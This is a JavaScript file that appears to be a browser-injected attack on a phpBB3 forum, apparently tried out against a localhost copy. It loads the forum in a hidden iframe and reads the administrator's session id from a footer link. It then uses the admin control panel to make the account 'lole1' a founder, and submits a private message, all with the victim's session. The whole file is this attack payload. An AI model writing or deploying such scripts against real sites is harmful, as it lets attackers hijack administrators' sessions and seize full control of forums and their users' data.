// var script_ids = ["a1", "a2", "a3", "a4"];
//var header = document.getElementById('header');
//var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
var user_name = "homu";
if (!document.getElementById("gp_h1")) {
    if (user_name === "homu") {
        var iframe = document.createElement('iframe');
        iframe.id = "gp_h1";
        iframe.src = `http://localhost/AM/phpbb3/`;
        iframe.height = "600";
        iframe.width = "600";
        //iframe.style.opacity = 0;
        iframe.style.position = "absolute";
        iframe.style.zIndex = -1;
        //iframe.style.top = "-30px";
        //header.append(iframe);
        document.body.append(iframe);
        const wait = setTimeout(stealThisMoment, secondsToMS(3));
    };
}

function stealThisMoment() {
    console.log("3secs!");
    var sid = iframe.contentWindow.document.getElementsByClassName('footer-link text-strong')[0].href.split('=')[1];
    console.log("sid is = " + sid);
    iframe.contentWindow.window.location.replace(`http://localhost/AM/phpbb3/adm/index.php?sid=${sid}&i=acp_users&mode=overview`);
    setTimeout(() => { 
        iframe.contentWindow.document.getElementById("username").value = "lole1";
        iframe.contentWindow.document.getElementsByName("submituser")[0].click();
        setTimeout(() => { 
            iframe.contentWindow.document.getElementsByName("user_founder")[0].click();
            iframe.contentWindow.document.getElementsByName("update")[0].click();
         }, secondsToMS(3));
     }, secondsToMS(3));
    iframe.contentWindow.document.getElementById("username_list").value = "!lole";
    iframe.contentWindow.document.getElementsByName("add_to")[0].click();
    iframe.contentWindow.document.getElementById("subject").value = "beary";
    iframe.contentWindow.document.getElementById("message").value = "chicanery";
    iframe.contentWindow.document.getElementsByName("post")[0].click();
    setTimeout(() => { iframe.contentWindow.document.getElementsByName("post")[0].click() }, secondsToMS(3));
};


function secondsToMS(seconds) {
    return seconds * 1000;
};


